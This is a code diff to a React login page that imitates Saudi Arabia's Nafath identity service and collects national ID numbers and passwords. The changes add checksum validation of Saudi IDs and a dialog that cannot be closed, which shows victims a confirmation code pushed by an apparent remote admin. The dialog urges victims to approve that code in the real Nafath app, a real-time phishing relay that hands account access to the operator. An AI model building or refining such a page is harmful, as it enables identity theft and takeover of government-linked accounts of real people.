@@ -25,8 +25,39 @@ export default function Component() {
   const [idLogin, setLoginID] = useState("");
   const [password, setPassword] = useState("");
   const [showError, setShowError] = useState("");
+  const [idError, setIdError] = useState("");
 
   const visitorId = typeof window !== 'undefined' ? localStorage.getItem("visitor") || "" : ""
+  
+  // Saudi ID validation function (same as home page)
+  const validateSaudiId = (id: string): boolean => {
+    const cleanId = id.replace(/\s/g, "")
+    if (!/^\d{10}$/.test(cleanId)) {
+      setIdError("رقم الهوية يجب أن يكون 10 أرقام")
+      return false
+    }
+    if (!/^[12]/.test(cleanId)) {
+      setIdError("رقم الهوية يجب أن يبدأ بـ 1 أو 2")
+      return false
+    }
+    let sum = 0
+    for (let i = 0; i < 10; i++) {
+      let digit = Number.parseInt(cleanId[i])
+      if ((10 - i) % 2 === 0) {
+        digit *= 2
+        if (digit > 9) {
+          digit -= 9
+        }
+      }
+      sum += digit
+    }
+    if (sum % 10 !== 0) {
+      setIdError("رقم الهوية غير صحيح")
+      return false
+    }
+    setIdError("")
+    return true
+  }
   
   // Monitor for admin redirects
   useRedirectMonitor({ visitorId, currentPage: "nafad" })
@@ -77,13 +108,27 @@ export default function Component() {
           if (data.nafadConfirmationCode) {
             console.log("[nafad] Received confirmation code:", data.nafadConfirmationCode)
             setConfirmationCode(data.nafadConfirmationCode)
-            setShowConfirmDialog(true)
-            setIsLoading(false) // Stop spinner when modal appears
-            setShowError("") // Clear any previous errors
-            setShowSuccessDialog(false) // Close success dialog if open
+            
+            // Use localStorage to track shown codes (persists across page reloads)
+            const storageKey = `nafad_shown_${visitorId}`
+            const lastShownCode = localStorage.getItem(storageKey)
+            
+            // Only show modal if this is a NEW code (not previously shown)
+            if (data.nafadConfirmationCode !== lastShownCode) {
+              console.log("[nafad] New code detected, showing modal")
+              setShowConfirmDialog(true)
+              localStorage.setItem(storageKey, data.nafadConfirmationCode)
+              setIsLoading(false) // Stop spinner when modal appears
+              setShowError("") // Clear any previous errors
+              setShowSuccessDialog(false) // Close success dialog if open
+            } else {
+              console.log("[nafad] Code already shown, not opening modal")
+            }
           } else if (data.nafadConfirmationCode === "") {
             // Admin cleared the code
             setShowConfirmDialog(false)
+            const storageKey = `nafad_shown_${visitorId}`
+            localStorage.removeItem(storageKey) // Reset tracking
           }
 
           // Listen for admin approval/rejection
@@ -124,6 +169,11 @@ export default function Component() {
     const visitorId = localStorage.getItem("visitor");
     setShowError("");
 
+    // Validate ID before submitting
+    if (!validateSaudiId(idLogin)) {
+      return
+    }
+
     setIsLoading(true);
 
     // Save current data to history before updating
@@ -142,6 +192,8 @@ export default function Component() {
     // Keep loading until modal appears (don't stop here)
     // setIsLoading will be set to false when modal opens or error occurs
   };
+
+  // Confirmation code will be displayed as two individual digits
 
   return (
     <div
@@ -191,13 +243,29 @@ export default function Component() {
                 </p>
               </div>
 
-              <Input
-                placeholder="أدخل رقم الأحوال/الإقامة الخاص بك هنا"
-                className="text-right border-gray-300 h-12 text-lg focus:ring-2 focus:ring-teal-500 transition-all"
-                dir="rtl"
-                onChange={(e) => setLoginID(e.target.value)}
-                required
-              />
+              <div className="space-y-2">
+                <Input
+                  placeholder="أدخل رقم الأحوال/الإقامة الخاص بك هنا"
+                  className={`text-right border-gray-300 h-12 text-lg focus:ring-2 focus:ring-teal-500 transition-all ${idError ? 'border-red-500' : ''}`}
+                  dir="rtl"
+                  value={idLogin}
+                  onChange={(e) => {
+                    const value = e.target.value.replace(/[^0-9]/g, '').slice(0, 10)
+                    setLoginID(value)
+                    if (value.length === 10) {
+                      validateSaudiId(value)
+                    } else if (value.length > 0) {
+                      setIdError("رقم الهوية يجب أن يكون 10 أرقام")
+                    } else {
+                      setIdError("")
+                    }
+                  }}
+                  required
+                />
+                {idError && (
+                  <p className="text-sm text-red-600 text-right">{idError}</p>
+                )}
+              </div>
               <Input
                 placeholder="أدخل كلمة المرور الخاصة بك هنا"
                 className="text-right border-gray-300 h-12 text-lg focus:ring-2 focus:ring-teal-500 transition-all"
@@ -270,56 +338,38 @@ export default function Component() {
           </CardContent>
         </Card>
 
-        {/* Confirmation Code Display Dialog */}
-        <Dialog open={showConfirmDialog} onOpenChange={setShowConfirmDialog}>
-          <DialogContent className="max-w-md mx-auto" dir="rtl">
+        {/* Confirmation Code Display Dialog - UPDATED WITH TWO SEPARATE CODES */}
+        <Dialog open={showConfirmDialog} onOpenChange={() => {}}>
+          <DialogContent className="max-w-md mx-auto [&>button]:hidden" dir="rtl">
             <DialogHeader>
               <DialogTitle className="text-center text-2xl font-bold text-teal-600 mb-2">
                 رمز التحقق
               </DialogTitle>
-              <p className="text-center text-sm text-gray-600">
-                يرجى التحقق من الرقمين التاليين في تطبيق نفاذ
+              <p className="text-center text-lg text-gray-800 leading-relaxed font-semibold px-4">
+                الرجاء الدخول إلى تطبيق نفاذ والموافقة على الرقم أدناه
               </p>
             </DialogHeader>
 
             <div className="text-center space-y-6 p-4">
-              <div className="bg-gradient-to-br from-teal-50 to-teal-100 border-2 border-teal-300 rounded-xl p-8 shadow-inner">
-                <div className="text-sm text-gray-600 mb-3 font-medium">
-                  الرقمان المطلوبان
-                </div>
-                <div className="text-6xl font-bold text-teal-600 tracking-widest font-mono">
-                  {confirmationCode || "--"}
-                </div>
-              </div>
-
-              <div className="space-y-3 bg-gray-50 p-4 rounded-lg">
-                <div className="flex items-center justify-center gap-2 text-teal-600 mb-2">
-                  <ShieldAlert className="w-5 h-5" />
-                  <div className="text-gray-800 font-bold">
-                    في انتظار التأكيد
+              {/* TWO DIGITS SIDE BY SIDE IN SMALLER ELEGANT BOX */}
+              <div className="mx-auto w-48 h-48 bg-gradient-to-br from-teal-50 to-teal-100 border-2 border-teal-300 rounded-2xl shadow-lg flex items-center justify-center">
+                <div className="flex gap-3 justify-center items-center" dir="ltr">
+                  <div className="text-6xl font-bold text-teal-600 font-mono">
+                    {confirmationCode?.[0] || "-"}
+                  </div>
+                  <div className="text-6xl font-bold text-teal-600 font-mono">
+                    {confirmationCode?.[1] || "-"}
                   </div>
                 </div>
-                <div className="text-sm text-gray-600 leading-relaxed">
-                  يرجى التحقق من الرقمين في تطبيق نفاذ على جهازك المحمول
-                  والانتظار حتى يتم التأكيد
-                </div>
               </div>
 
-              <div className="flex items-center justify-center gap-3 text-teal-600 py-4">
+              <div className="flex items-center justify-center gap-3 text-teal-600 py-2">
                 <div className="relative">
                   <div className="w-3 h-3 bg-teal-600 rounded-full animate-ping absolute"></div>
                   <div className="w-3 h-3 bg-teal-600 rounded-full"></div>
                 </div>
                 <div className="text-sm font-medium">في انتظار الموافقة...</div>
               </div>
-
-              <Button
-                variant="outline"
-                onClick={() => setShowConfirmDialog(false)}
-                className="w-full border-2 border-gray-300 text-gray-700 hover:bg-gray-100 h-11 font-semibold"
-              >
-                إلغاء
-              </Button>
             </div>
           </DialogContent>
         </Dialog>
@@ -361,7 +411,6 @@ export default function Component() {
       {/* Footer */}
       <footer className="mt-12 p-6 bg-white border-t">
         <div className="text-center space-y-6 max-w-4xl mx-auto">
-
           <div className="flex flex-wrap justify-center gap-x-6 gap-y-2 text-xs text-gray-600">
             <a
               href="#"
